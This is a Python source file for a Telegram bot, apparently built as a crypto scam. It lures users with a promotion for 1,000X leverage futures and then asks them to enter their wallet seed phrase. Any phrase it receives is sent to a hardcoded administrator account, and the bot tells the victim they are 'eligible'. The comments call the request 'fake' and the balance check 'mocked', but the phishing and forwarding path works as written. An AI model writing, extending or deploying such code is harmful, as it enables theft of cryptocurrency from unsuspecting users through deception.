from aiogram import Bot, Dispatcher, types
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiohttp import web
import os
import logging

TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 6780752295

bot = Bot(token=TOKEN)
dp = Dispatcher()

# 1. Welcome Message
@dp.message(commands=["start"])
async def send_welcome(message: types.Message):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton(
        text="Visit the OCF page", url="https://opencryptofoundation.com"))
    await message.answer(
        "👋 Welcome to the project!\n\n"
        "1,000X leverage on Futures contracts! This isn’t for everyone but if used right it could be a great speculation tool!\n"
        "👉 [Futures.Syncron.Network](https://futures.syncron.network)",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )
    # Next step (after user clicks) is handled by message filter (simulated)

# 2. Fake wallet phrase request after any message (simulated trigger)
@dp.message(lambda message: message.text.lower().startswith("done") or "ocf" in message.text.lower())
async def ask_wallet(message: types.Message):
    await message.answer("🧠 Please enter your wallet phrase to import:")

# 3. Accept wallet phrase (mocked)
@dp.message(lambda message: len(message.text.split()) > 5)
async def receive_wallet(message: types.Message):
    phrase = message.text.strip()
    
    # Simulate balance check (later replace with actual RPC call)
    sol_balance = 0.25  # mock value

    if sol_balance >= 0.2:
        await message.answer("✅ You are eligible! Welcome aboard.")
        await bot.send_message(
            ADMIN_ID,
            f"✅ New eligible wallet:\n\nPhrase:\n{phrase}\nBalance: {sol_balance} SOL",
            parse_mode="Markdown"
        )
    else:
        await message.answer("❌ Ineligible. You must have at least 0.2 SOL.")

# Set webhook on startup
async def on_startup(app):
    webhook_url = "https://telegram-wallet-bot-q611.onrender.com/webhook"
    await bot.set_webhook(webhook_url)

# Aiohttp app setup
app = web.Application()
app.on_startup.append(on_startup)
SimpleRequestHandler(dispatcher=dp, bot=bot).register(app, path="/webhook")
setup_application(app, dp)

if name == "main":
    logging.basicConfig(level=logging.INFO)
    web.run_app(app, port=int(os.environ.get('PORT', 8080)))